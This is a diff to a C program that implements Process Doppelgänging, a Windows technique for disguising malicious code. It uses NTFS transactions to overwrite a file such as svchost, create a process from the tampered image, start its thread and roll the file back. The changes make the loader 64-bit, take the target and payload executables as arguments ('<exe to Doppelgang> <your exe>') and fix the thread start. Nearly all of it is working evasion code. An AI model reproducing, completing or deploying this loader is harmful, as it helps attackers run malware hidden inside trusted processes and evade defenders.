@@ -5,6 +5,7 @@
 #include <lmerr.h>
 #include <winternl.h>
 #include <psapi.h>
+#include <Processthreadsapi.h>
 #include "ntdefs.h"
 
 // To ensure correct resolution of symbols, add Psapi.lib to TARGETLIBS
@@ -93,27 +94,28 @@ LPVOID GetBaseAddressByName(HANDLE hProcess)
 	lpMem = 0;
 	while (lpMem < si.lpMaximumApplicationAddress) {
 		VirtualQueryEx(hProcess, lpMem, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
-			
 		if (mbi.Type & MEM_IMAGE)
 			return mbi.BaseAddress;
 		/* increment lpMem to next region of memory */
-		lpMem = (LPVOID)((DWORD)mbi.BaseAddress +(DWORD)mbi.RegionSize);
+		lpMem = (LPVOID)((ULONGLONG)mbi.BaseAddress +(ULONGLONG)mbi.RegionSize);
 			
 	}
 	return NULL;
 }
 
-int main(void)
+int main(int argc,char *argv[] )
 {
 
 	LARGE_INTEGER liFileSize;
 	DWORD dwFileSize;
 	HANDLE hSection;
 	NTSTATUS ret;
-	//WCHAR stringBuffer[MAX_PATH];//= L"C:\\Users\\Administrator\\Desktop\\svchost.exe";//L"C:\\Windows\\SysWOW64\\svchost.exe";
 	
 	UNICODE_STRING  string;
-
+	if (argc < 3) {
+		printf("%s <exe to Doppelgang> <your exe>",argv[0]);
+		return 0;
+	}
 	HANDLE hNtdll = GetModuleHandle("ntdll.dll");
 	if (NULL==hNtdll)
 	{
@@ -147,7 +149,7 @@ int main(void)
 	}
 	printf("[+] CreateFileTransacted on svchost, handle 0x%x\n", hTransactedFile);
 
-	HANDLE hExe = CreateFile("MalExe.exe",
+	HANDLE hExe = CreateFile(argv[2],
 		 GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (INVALID_HANDLE_VALUE == hExe)
 	{
@@ -209,7 +211,9 @@ int main(void)
 
 	HANDLE hProcess=0;
 	my_RtlInitUnicodeString initUnicodeString = (my_RtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
-	initUnicodeString(&string, L"C:\\Users\\Administrator\\Desktop\\svchost.exe");
+	WCHAR temp[MAX_PATH] = { 0 };
+	MultiByteToWideChar(CP_UTF8, 0, argv[1], strlen(argv[1]), temp, MAX_PATH);
+	initUnicodeString(&string, temp);
 
 	ret = createProcessEx(&hProcess, GENERIC_ALL,NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
 	
@@ -220,12 +224,16 @@ int main(void)
 		return -1;
 	}
 
-
 	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)buffer;
+
 	PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS32)(buffer + dos_header->e_lfanew);
-	DWORD oep = ntHeader->OptionalHeader.AddressOfEntryPoint;
-	oep+=(DWORD)GetBaseAddressByName(hProcess);
-	printf("[+] our new process oep is 0x%08x\n", oep);
+
+	ULONGLONG oep = ntHeader->OptionalHeader.AddressOfEntryPoint;
+
+	oep+=(ULONGLONG)GetBaseAddressByName(hProcess);
+
+
+	printf("[+] our new process oep is 0x%llx\n", oep);
 	NtCreateThreadEx createThreadEx = (NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
 	if (NULL == createThreadEx)
 	{
@@ -234,14 +242,7 @@ int main(void)
 	}
 	printf("[+] Got NtCreateThreadEx 0x%08p\n", createThreadEx);
 
-	HANDLE hThread;
-	ret= createThreadEx(&hThread, GENERIC_ALL,NULL, hProcess, (LPTHREAD_START_ROUTINE)oep, NULL,TRUE, 0, 0, 0, NULL);
-	if (FALSE == NT_SUCCESS(ret))
-	{
-		DisplayErrorText(GetLastError());
-		return -1;
-	}
-	printf("[+] creating thread with oep at %x\n", oep);
+
 	my_PRTL_USER_PROCESS_PARAMETERS ProcessParams = 0;
 	RtlCreateProcessParametersEx createProcessParametersEx = (RtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
 	if (NULL == createProcessParametersEx)
@@ -312,32 +313,15 @@ int main(void)
 	}
 	printf("[+] writing our paramters to the process peb 0x%08x\n", peb);
 
-	NtResumeThread resumeThread = (NtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");
-	if (NULL == resumeThread)
-	{
-		DisplayErrorText(GetLastError());
-		return -1;
-	}
-	printf("[+] Got NtResumeThread 0x%08p\n", resumeThread);
-
-	WOW64_CONTEXT context;
-	context.ContextFlags = CONTEXT_ALL;
-	err = Wow64GetThreadContext(hThread, &context);
-	if (FALSE == err)
-	{
-		DisplayErrorText(GetLastError());
-		return -1;
-	}
-	printf("eip %x", context.Eip);
-	getchar();
-
-	ret = resumeThread(hThread, NULL);
+	HANDLE hThread;
+	ret = createThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)oep, NULL, FALSE, 0, 0, 0, NULL);
+	printf("[+] Thread created with handle %x\n", hThread);
 	if (FALSE == NT_SUCCESS(ret))
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] resumed our thread\n", peb);
+
 	if (FALSE == RollbackTransaction(hTransaction))
 	{
 		DisplayErrorText(GetLastError());
@@ -345,7 +329,6 @@ int main(void)
 	}
 	printf("[+] rolling back the original svchost\n");
 
-	//TerminateProcess(hProcess, 9);
 	CloseHandle(hProcess);
 	CloseHandle(hExe);
 	CloseHandle(hTransactedFile);
